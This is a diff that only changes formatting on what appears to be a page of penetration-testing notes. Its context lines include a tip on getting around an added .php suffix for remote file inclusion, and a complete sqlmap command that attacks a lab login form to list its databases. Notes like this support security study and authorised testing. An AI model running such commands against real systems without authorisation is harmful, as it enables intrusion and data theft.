@@ -91,8 +91,7 @@ Bypassing added suffix <b>.php</b> for RFI
 - comment the following lines
 <br/>
 
-<pre><code>
-#<FilesMatch ".+\.ph(p[345]?|t|tml)$">
+<pre><code>#<FilesMatch ".+\.ph(p[345]?|t|tml)$">
 #    setHandler application/x-httpd-php
 #</FilesMatch>
 </code></pre>
@@ -124,8 +123,7 @@ Bypassing added suffix <b>.php</b> for RFI
 <h4><b>SQL Injection:</b></h4>
 <p>When it seems like a sql injection, one can use <b>sqlmap</b> to make things easier but without proper use it may not detect even an existing sql injection.</p>
 
-<pre><code>
-sqlmap --url=http://192.168.0.100:1337/index.php --method POST --data 'username=test&password=test&Submit=Login' --not-string='Username or Password is invalid' --dbms=MySQL --batch --dbs
+<pre><code>sqlmap --url=http://192.168.0.100:1337/index.php --method POST --data 'username=test&password=test&Submit=Login' --not-string='Username or Password is invalid' --dbms=MySQL --batch --dbs
 </code></pre>
 
 <p>Never forget to do user enumeration, may find interesting things.</p>
